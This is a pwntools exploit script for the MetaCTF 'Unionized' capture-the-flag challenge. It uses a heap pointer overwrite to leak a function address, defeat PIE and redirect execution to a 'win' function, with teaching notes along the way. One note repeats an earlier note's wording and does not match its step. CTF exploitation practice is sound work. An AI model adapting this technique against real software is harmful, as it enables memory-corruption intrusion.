'''
This script is modeled after Caitlin Whitehead's solution 
for the MetaCTF "Unionized" CyberGames CTF
https://blog.metactf.com/unionized-cybergames-2021/
'''

from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary,checksec=False)

gs = '''
continue
'''


def start():
    if (args.QEMU and args.GDB):
        p=process(['qemu-amd64', '-g', '1234', e.path])
        gdb.attach(target=('localhost',1234), exe=e.path, gdbscript=gs)
        return p
    elif (args.QEMU):
        return process(['qemu-amd64', e.path])
    elif args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)


p = start()


def create_string(length, content):
    log.info("Creating string of %i bytes with %s" % (length, content))
    p.sendlineafter(b'Exit', b'1')
    p.sendlineafter(b'?', b'1')
    p.sendlineafter(b'be', b'%i' % length)
    p.sendlineafter(b'data', content)


def edit_char(index, character):
    log.info("Editing index %i to be character %s" % (index, character))
    p.sendlineafter(b'Exit', b'3')
    p.sendlineafter(b'?', b'%i' % index)
    p.sendlineafter(b'?', b'4')
    p.sendlineafter(b':', b'%c' % character)


def edit_string(index, length, data):
    log.info("Editing index %i, to be string of %i bytes with %s" %
             (index, length, data))
    p.sendlineafter(b'Exit', b'3')
    p.sendlineafter(b'?', b'%i' % index)
    p.sendlineafter(b'?', b'1')
    p.sendlineafter(b'be', b'%i' % length)
    p.sendlineafter(b'data', data)


def display():
    log.info("Calling display()")
    p.sendlineafter(b'Exit\n', b'2')


create_string(20, b'1' * 20)
create_string(20, b'2' * 20)
create_string(20, b'3' * 20)
create_string(20, b'4' * 20)


note1 = """
using viz_heap, we see the layout of the 
heap, including the char* and ptrs* to display_function
"""
log.info(note1)
pause()


edit_char(0, b'\x70')

note2 = """
using viz_heap, we see that the \x70 has overwritten the
char * with a ptr to the display_data function, this 
allows us to leak the display_ptr address and calculate
the base of the funciton
"""
log.info(note2)
pause()

log.info("Editing Char")
edit_string(0, 0, b'')
display()


leak = u64(p.recv(6)+b'\x00'*2)
e.address = leak - e.sym['display_string']
edit_char(1, b'\x70')

edit_string(1, 8, p64(e.sym['win']))

note3 = """
using viz_heap, we see that the win has overwritten the
char * with a ptr to the display_data function, this 
allows us to leak the display_ptr address and calculate
the base of the funciton
"""
log.info(note3)
pause()

display()

p.interactive()
